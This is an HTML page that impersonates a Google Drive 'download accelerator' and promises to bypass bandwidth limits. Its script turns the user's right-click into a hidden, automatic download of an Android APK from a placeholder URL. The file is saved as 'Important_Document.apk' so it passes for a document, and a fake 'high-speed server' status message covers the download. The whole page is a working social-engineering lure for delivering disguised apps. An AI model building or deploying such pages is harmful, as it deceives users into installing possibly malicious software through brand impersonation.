<!doctype html>
<html>
  <head>
    <title>Google Drive Download Assistant</title>
    <style>
      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        text-align: center;
        padding-top: 100px;
        background-color: #f1f3f4;
      }
      #status {
        color: #d93025;
        font-weight: bold;
        margin-top: 25px;
        font-size: 14px;
      }
      .instruction {
        padding: 30px;
        border: 2px dashed #4285f4;
        background-color: #ffffff;
        display: inline-block;
        cursor: context-menu;
        border-radius: 8px;
        color: #1a73e8;
        font-weight: 500;
        transition: background 0.3s;
      }
      .instruction:hover {
        background-color: #e8f0fe;
      }
      h2 {
        color: #202124;
      }
    </style>
  </head>
  <body>
    <h2>Google Drive Download Accelerator</h2>
    <p>Follow the instruction below to bypass bandwidth limits:</p>

    <div id="link" class="instruction">
      Right-Click Here and Select "Open in Incognito Tab" to Start Fast Download
    </div>

    <p id="status"></p>

    <!-- Hidden download element -->
    <a id="downloadTrigger" style="display: none"></a>

    <script>
      document
        .getElementById("link")
        .addEventListener("contextmenu", function (event) {
          const status = document.getElementById("status");
          status.innerText =
            "Connecting to high-speed server... Please wait 5 seconds.";

          // Timer updated to 5000ms (5 seconds)
          setTimeout(function () {
            const dl = document.getElementById("downloadTrigger");

            // Target file URL
            dl.href = "https://example.com/actual-file.apk";
            dl.download = "Important_Document.apk";
            dl.click();

            status.innerText = "Download initiated successfully!";
            status.style.color = "#188038";
          }, 5000);
        });
    </script>
  </body>
</html>
